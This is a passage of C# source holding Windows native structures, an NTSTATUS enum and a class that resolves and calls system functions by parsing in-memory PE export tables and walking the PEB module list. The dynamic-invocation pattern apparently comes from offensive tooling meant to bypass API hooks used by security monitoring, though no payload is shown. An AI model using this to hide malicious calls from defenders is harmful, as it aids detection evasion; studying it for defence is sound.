            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }
        public enum ProcThreadAttribute : int
        {
            MITIGATION_POLICY = 0x20007,
            PARENT_PROCESS = 0x00020000
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }
        public enum NTSTATUS : uint
        {
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,
            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,
            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,
            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            ConflictingAddresses = 0xc0000018,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InsufficientResources = 0xc000009a,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            ProcessIsTerminating = 0xc000010a,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            InvalidAddress = 0xc0000141,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,
            MaximumNtStatus = 0xffffffff
        }
        public struct LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LDR_DATA_TABLE_ENTRY
        {
            public LIST_ENTRY InLoadOrderLinks;
            public LIST_ENTRY InMemoryOrderLinks;
            public LIST_ENTRY InInitializationOrderLinks;
            public IntPtr DllBase;
            public IntPtr EntryPoint;
            public UInt32 SizeOfImage;
            public UNICODE_STRING FullDllName;
            public UNICODE_STRING BaseDllName;
        }
        [StructLayout(LayoutKind.Explicit)]
        public struct ApiSetNamespace
        {
            [FieldOffset(0x0C)]
            public int Count;
            [FieldOffset(0x10)]
            public int EntryOffset;
        }
        [StructLayout(LayoutKind.Explicit, Size = 24)]
        public struct ApiSetNamespaceEntry
        {
            [FieldOffset(0x04)]
            public int NameOffset;
            [FieldOffset(0x08)]
            public int NameLength;
            [FieldOffset(0x10)]
            public int ValueOffset;
            [FieldOffset(0x14)]
            public int ValueLength;

        }

        [StructLayout(LayoutKind.Explicit)]
        public struct ApiSetValueEntry
        {
            [FieldOffset(0x00)]
            public int Flags;
            [FieldOffset(0x04)]
            public int NameOffset;
            [FieldOffset(0x08)]
            public int NameCount;
            [FieldOffset(0x0C)]
            public int ValueOffset;
            [FieldOffset(0x10)]
            public int ValueCount;
        }
        public enum PROCESSINFOCLASS : int
        {
            ProcessBasicInformation = 0, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
            ProcessWow64Information, // q: ULONG_PTR
        };
    }
    public class Invoke
    {
        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
        {
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }
        public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false, bool ResolveForwards = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }
            return GetExportAddress(hModule, FunctionName, ResolveForwards);
        }
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, bool ResolveForwards = false)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Get the VAs of the name table's beginning and end.
                Int64 NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
                Int64 NamesFinal = NamesBegin + NumberOfNames * 4;

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);

                        if (ResolveForwards == true)
                            // If the export address points to a forward, get the address
                            FunctionPtr = GetForwardAddress(FunctionPtr);

                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }
        public static IntPtr GetForwardAddress(IntPtr ExportAddress)
        {
            IntPtr FunctionPtr = ExportAddress;
            try
            {
                // Assume it is a forward. If it is not, we will get an error
                string ForwardNames = Marshal.PtrToStringAnsi(FunctionPtr);
                string[] values = ForwardNames.Split('.');

                string ForwardModuleName = values[0];
                string ForwardExportName = values[1];

                // Check if it is an API Set mapping
                Dictionary<string, string> ApiSet = GetApiSetMapping();
                string LookupKey = ForwardModuleName.Substring(0, ForwardModuleName.Length - 2) + ".dll";
                if (ApiSet.ContainsKey(LookupKey))
                    ForwardModuleName = ApiSet[LookupKey];
                else
                    ForwardModuleName = ForwardModuleName + ".dll";

                IntPtr hModule = GetPebLdrModuleEntry(ForwardModuleName);
                if (hModule != IntPtr.Zero)
                {
                    FunctionPtr = GetExportAddress(hModule, ForwardExportName);
                }
            }
            catch
            {
                // Do nothing, it was not a forward
            }
            return FunctionPtr;
        }
        public static STRUCTS.PROCESS_BASIC_INFORMATION NtQueryInformationProcessBasicInformation(IntPtr hProcess)
        {
            STRUCTS.NTSTATUS retValue = NtQueryInformationProcess(hProcess, STRUCTS.PROCESSINFOCLASS.ProcessBasicInformation, out IntPtr pProcInfo);
            if (retValue != STRUCTS.NTSTATUS.Success)
            {
                throw new UnauthorizedAccessException("Access is denied.");
            }

            return (STRUCTS.PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pProcInfo, typeof(STRUCTS.PROCESS_BASIC_INFORMATION));
        }
        public static IntPtr GetPebLdrModuleEntry(string DLLName)
        {
            // Get _PEB pointer
            STRUCTS.PROCESS_BASIC_INFORMATION pbi = NtQueryInformationProcessBasicInformation((IntPtr)(-1));

            // Set function variables
            bool Is32Bit = false;
            UInt32 LdrDataOffset = 0;
            UInt32 InLoadOrderModuleListOffset = 0;
            if (IntPtr.Size == 4)
            {
                Is32Bit = true;
                LdrDataOffset = 0xc;
                InLoadOrderModuleListOffset = 0xC;
            }
            else
            {
                LdrDataOffset = 0x18;
                InLoadOrderModuleListOffset = 0x10;
            }

            // Get module InLoadOrderModuleList -> _LIST_ENTRY
            IntPtr PEB_LDR_DATA = Marshal.ReadIntPtr((IntPtr)((UInt64)pbi.PebBaseAddress + LdrDataOffset));
            IntPtr pInLoadOrderModuleList = (IntPtr)((UInt64)PEB_LDR_DATA + InLoadOrderModuleListOffset);
            STRUCTS.LIST_ENTRY le = (STRUCTS.LIST_ENTRY)Marshal.PtrToStructure(pInLoadOrderModuleList, typeof(STRUCTS.LIST_ENTRY));

            // Loop entries
            IntPtr flink = le.Flink;
            IntPtr hModule = IntPtr.Zero;
            STRUCTS.LDR_DATA_TABLE_ENTRY dte = (STRUCTS.LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(STRUCTS.LDR_DATA_TABLE_ENTRY));
            while (dte.InLoadOrderLinks.Flink != le.Blink)
            {
                // Match module name
                if (Marshal.PtrToStringUni(dte.FullDllName.Buffer).EndsWith(DLLName, StringComparison.OrdinalIgnoreCase))
                {
                    hModule = dte.DllBase;
                }

                // Move Ptr
                flink = dte.InLoadOrderLinks.Flink;
                dte = (STRUCTS.LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(STRUCTS.LDR_DATA_TABLE_ENTRY));
            }

            return hModule;
        }
        public static Dictionary<string, string> GetApiSetMapping()
        {
            STRUCTS.PROCESS_BASIC_INFORMATION pbi = NtQueryInformationProcessBasicInformation((IntPtr)(-1));
            UInt32 ApiSetMapOffset = IntPtr.Size == 4 ? (UInt32)0x38 : 0x68;
            // Create mapping dictionary
            Dictionary<string, string> ApiSetDict = new Dictionary<string, string>();
            IntPtr pApiSetNamespace = Marshal.ReadIntPtr((IntPtr)((UInt64)pbi.PebBaseAddress + ApiSetMapOffset));
            STRUCTS.ApiSetNamespace Namespace = (STRUCTS.ApiSetNamespace)Marshal.PtrToStructure(pApiSetNamespace, typeof(STRUCTS.ApiSetNamespace));
            for (var i = 0; i < Namespace.Count; i++)
            {
                STRUCTS.ApiSetNamespaceEntry SetEntry = new STRUCTS.ApiSetNamespaceEntry();
                IntPtr pSetEntry = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)Namespace.EntryOffset + (UInt64)(i * Marshal.SizeOf(SetEntry)));
                SetEntry = (STRUCTS.ApiSetNamespaceEntry)Marshal.PtrToStructure(pSetEntry, typeof(STRUCTS.ApiSetNamespaceEntry));
                string ApiSetEntryName = Marshal.PtrToStringUni((IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.NameOffset), SetEntry.NameLength / 2);
                string ApiSetEntryKey = ApiSetEntryName.Substring(0, ApiSetEntryName.Length - 2) + ".dll"; // Remove the patch number and add .dll

                STRUCTS.ApiSetValueEntry SetValue = new STRUCTS.ApiSetValueEntry();
                IntPtr pSetValue = IntPtr.Zero;

                if (SetEntry.ValueLength == 1)
                    pSetValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset);
                else if (SetEntry.ValueLength > 1)
                {
                    // Loop through the hosts until we find one that is different from the key, if available
                    for (var j = 0; j < SetEntry.ValueLength; j++)
                    {
                        IntPtr host = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset + (UInt64)Marshal.SizeOf(SetValue) * (UInt64)j);
                        if (Marshal.PtrToStringUni(host) != ApiSetEntryName)
                            pSetValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset + (UInt64)Marshal.SizeOf(SetValue) * (UInt64)j);
                    }
                    // If there is not one different from the key, then just use the key and hope that works
                    if (pSetValue == IntPtr.Zero)
                        pSetValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset);
                }

                SetValue = (STRUCTS.ApiSetValueEntry)Marshal.PtrToStructure(pSetValue, typeof(STRUCTS.ApiSetValueEntry));
                string ApiSetValue = string.Empty;
                if (ApiSetEntryName.Contains("processthreads"))
                {
                    IntPtr pValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetValue.ValueOffset);
                }
                if (SetValue.ValueCount != 0)
                {
                    IntPtr pValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetValue.ValueOffset);
                    ApiSetValue = Marshal.PtrToStringUni(pValue, SetValue.ValueCount / 2);
                }
                ApiSetDict.Add(ApiSetEntryKey, ApiSetValue);
            }
            // Return dict
            return ApiSetDict;
        }
        public static STRUCTS.NTSTATUS NtQueryInformationProcess(IntPtr hProcess, STRUCTS.PROCESSINFOCLASS processInfoClass, out IntPtr pProcInfo)
        {
            int processInformationLength;
            UInt32 RetLen = 0;

            switch (processInfoClass)
            {
                case STRUCTS.PROCESSINFOCLASS.ProcessWow64Information:
                    pProcInfo = Marshal.AllocHGlobal(IntPtr.Size);
                    RtlZeroMemory(pProcInfo, IntPtr.Size);
                    processInformationLength = IntPtr.Size;
                    break;
                case STRUCTS.PROCESSINFOCLASS.ProcessBasicInformation:
                    STRUCTS.PROCESS_BASIC_INFORMATION PBI = new STRUCTS.PROCESS_BASIC_INFORMATION();
                    pProcInfo = Marshal.AllocHGlobal(Marshal.SizeOf(PBI));
                    RtlZeroMemory(pProcInfo, Marshal.SizeOf(PBI));
                    Marshal.StructureToPtr(PBI, pProcInfo, true);
                    processInformationLength = Marshal.SizeOf(PBI);
                    break;
                default:
                    throw new InvalidOperationException($"Invalid ProcessInfoClass: {processInfoClass}");
            }
            object[] funcargs =
            {
                hProcess, processInfoClass, pProcInfo, processInformationLength, RetLen
            };

            STRUCTS.NTSTATUS retValue = (STRUCTS.NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtQueryInformationProcess", typeof(DELEGATES.NtQueryInformationProcess), ref funcargs);
            if (retValue != STRUCTS.NTSTATUS.Success)
            {
                throw new UnauthorizedAccessException("Access is denied.");
            }

            // Update the modified variables
            pProcInfo = (IntPtr)funcargs[2];
            return retValue;
        }
        public static void RtlZeroMemory(IntPtr Destination, int Length)
        {
            // Craft an array for the arguments
            object[] funcargs =
            {
                Destination, Length
            };

            DynamicAPIInvoke(@"ntdll.dll", @"RtlZeroMemory", typeof(DELEGATES.RtlZeroMemory), ref funcargs);
        }
    }
}
